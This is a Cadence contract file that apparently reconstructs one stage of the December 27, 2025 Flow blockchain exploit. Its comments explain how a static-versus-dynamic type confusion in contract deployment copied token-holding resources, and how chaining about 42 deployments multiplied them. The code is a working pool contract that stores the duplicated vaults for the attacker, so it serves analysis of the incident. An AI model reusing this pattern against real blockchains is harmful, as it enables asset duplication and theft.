import "NFTPoolInterface"
import "NFTFactory"

/**
 * NFTPoolInstance0.cdc - Resource pool for the December 27, 2025 Flow attack
 * 
 * EXPLOIT PART 3: CONTRACT INITIALIZER SEMANTICS
 * 
 * This contract demonstrates the third part of the exploit chain. When deploying
 * a contract with `account.contracts.add()`, the initializer arguments are passed
 * directly to the init function. The vulnerability was:
 * 
 * 1. The add() call did NOT verify that static types of arguments matched the
 *    contract's init parameter types
 * 2. The calling context believed the argument was statically a STRUCT (value type)
 * 3. But the contract initializer treated it as a RESOURCE
 * 4. Only the dynamic type was checked, not the static type
 * 
 * Result: The resource was COPIED instead of MOVED, duplicating it.
 * 
 * TWO-PHASE DEPLOYMENT PATTERN:
 * 
 * PHASE 1 - Seeding (deploy_pollinstance0.cdc):
 *   The FIRST instance (NFTPoolInstance0) is deployed with REAL tokens using
 *   legitimate move semantics (<-). No exploit occurs here - this seeds the
 *   attack with actual tokens from the attacker's vaults.
 *   
 *   acct.contracts.add(name: contractName, code: code.utf8, <- wrapper)
 *                                                          ↑
 *                                                   MOVE semantics (normal)
 * 
 * PHASE 2 - Exploitation (deploy_pollinstance18.cdc pattern):
 *   SUBSEQUENT instances use type confusion to duplicate resources:
 *   
 *   acct.contracts.add(name: nextContractName, code: code.utf8, 
 *                      keyList.keys[0].signatureAlgorithm.rawValue)
 *                      ↑
 *                      Static: struct chain → COPY semantics applied
 *                      Actual: @ResourceWrapper → RESOURCE DUPLICATED!
 * 
 * The attacker deployed ~42 of these pool contracts in sequence. The first
 * received real tokens, and each subsequent deployment duplicated them.
 * ~41 duplications resulted in 2^41 ≈ 2.2 trillion multiplier.
 * 
 * See: https://flow.com/post/dec-27-technical-post-mortem
 */
access(all) contract NFTPoolInstance0: NFTPoolInterface {

    /**
     * Resource pool storing wrapped resources (duplicated token vaults)
     * 
     * Each ResourceWrapper in this array contains duplicated FungibleToken.Vault
     * resources that were created via the type confusion exploit.
     */
    access(self) var resourcePool: @[NFTFactory.ResourceWrapper]

    /**
     * withdrawResource - Extracts wrapped resources from the pool
     * 
     * Security check: Only the deploying account can withdraw.
     * This is an additional safeguard (beyond the salt check in rogue_mint.cdc)
     * to ensure only the attacker can access the duplicated tokens.
     * 
     * The check `account.address == self.account.address` verifies the caller
     * is the same account that deployed this contract instance.
     */
    access(all) fun withdrawResource(account: auth(Storage) &Account): @NFTFactory.ResourceWrapper? {
        assert(account.address == self.account.address, message: "4")
        if self.resourcePool.length > 0 {
            return <- self.resourcePool.remove(at: 0)
        } else {
            return nil
        }
    }

    /**
     * Contract initializer - THE DUPLICATION POINT
     * 
     * This is where the actual token duplication occurred:
     * 
     * 1. The attacker prepared a ResourceWrapper containing token vaults
     * 2. Through Parts 1 & 2 of the exploit, this resource was "disguised" as a struct
     *    (statically typed as value, but dynamically still a resource)
     * 3. When passed to account.contracts.add() to deploy this contract:
     *    - The calling context saw a STRUCT → applied COPY semantics
     *    - The init() saw a RESOURCE → stored it normally
     *    - Result: The resource was duplicated!
     * 
     * 4. The attacker could then:
     *    - Keep the "original" (which was actually a copy)
     *    - Deploy another pool contract with it
     *    - Repeat 42 times to achieve massive duplication
     * 
     * The argResource parameter receives what should be a MOVED resource,
     * but due to the type confusion, it received a COPIED resource.
     */
    init(argResource: @NFTFactory.ResourceWrapper) {
        self.resourcePool <- [<- argResource]
    }
}
